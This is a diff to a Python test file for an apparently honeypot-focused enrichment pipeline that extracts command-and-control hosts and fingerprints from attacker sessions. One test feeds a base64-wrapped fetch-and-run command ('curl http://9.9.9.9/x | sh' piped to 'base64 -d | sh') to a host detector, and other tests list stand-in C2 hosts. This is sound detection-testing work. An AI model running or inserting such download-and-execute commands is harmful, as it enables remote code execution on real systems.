@@ -77,14 +77,20 @@ def test_self_hosted_flag(session: SessionIn) -> None:
 def test_pipeline_additive_and_strip(raw: dict) -> None:
     enriched = process(raw)
     doc = enriched.session_doc
-    # additive fields present
-    assert set(doc["c2_hosts"]) == {"59.96.137.61", "evil.example.com", "5.6.7.8"}
-    assert doc["hassh"] == "92674389fa1e47a27ddd8d9b63ecd42b"
-    assert doc["playbook_hash"] and doc["enrich_version"] == "1"
+    hp = doc["hp_data"]
+    # top-level pivot + marker
+    assert set(doc["c2_hosts"]) == {"59.96.137.61", "evil.example.com"}
+    assert doc["enrich_version"] == "c2e-1"
+    # enrichment written into hp_data (drop-in with the old proxy)
+    assert hp["hassh"] == "92674389fa1e47a27ddd8d9b63ecd42b"
+    assert len(hp["playbook_hash"]) == 40  # SHA1, matches production
+    assert hp["iocs_c2_hosts"] == doc["c2_hosts"]  # one source, two surfaces
+    assert "5.6.7.8" not in doc["c2_hosts"]  # callback is a ledger row, not a session host
+    assert hp["enrich_schema_version"] == "1"
     # transport-only bytes stripped; every other field survives
-    assert "content_b64" not in doc["hp_data"]["files"][0]
-    assert doc["hp_data"]["files"][0]["shasum"].startswith("8c1bd271")
-    assert doc["hp_data"]["unknown_stock_field"] == "must pass through verbatim"
+    assert "content_b64" not in hp["files"][0]
+    assert hp["files"][0]["shasum"].startswith("8c1bd271")
+    assert hp["unknown_stock_field"] == "must pass through verbatim"
 
 
 def test_envelope_tags(raw: dict) -> None:
@@ -102,7 +108,7 @@ def test_base64_wrapped_host_seen() -> None:
     import base64
 
     blob = base64.b64encode(b"curl http://9.9.9.9/x | sh").decode()
-    hosts = dict(find_hosts(f"echo {blob} | base64 -d | sh"))
+    hosts = dict(find_hosts(f'echo "{blob}" | base64 -d | sh'))
     assert "9.9.9.9" in hosts
 
 
